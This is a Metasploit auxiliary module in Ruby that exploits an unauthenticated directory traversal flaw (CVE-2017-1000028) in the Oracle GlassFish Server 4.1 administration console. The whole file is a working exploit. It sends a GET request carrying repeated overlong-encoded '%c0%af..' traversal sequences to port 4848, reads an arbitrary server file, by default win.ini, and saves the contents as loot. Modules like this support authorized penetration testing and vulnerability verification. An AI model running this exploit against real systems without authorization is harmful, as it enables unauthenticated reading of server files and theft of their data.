##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Path Traversal in Oracle GlassFish Server Open Source Edition',
      'Description' => %q{
        This module exploits an unauthenticated directory traversal vulnerability
        which exists in administration console of Oracle GlassFish Server 4.1, which is
        listening by default on port 4848/TCP.
      },
      'References'  =>
        [
          ['CVE', '2017-1000028'],
          ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904'],
          ['EDB', '39441']
        ],
      'Author'      =>
        [
          'Trustwave SpiderLabs', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
      'DisclosureDate' => 'Aug 08 2015',
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(4848),
        OptString.new('FILEPATH', [true, "The path to the file to read", '/windows/win.ini']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])
      ])
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = "%c0%af.." * datastore['DEPTH'] << filename

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/theme/META-INF/prototype#{traversal}"
    })

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
    end

    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      'oracle.traversal',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
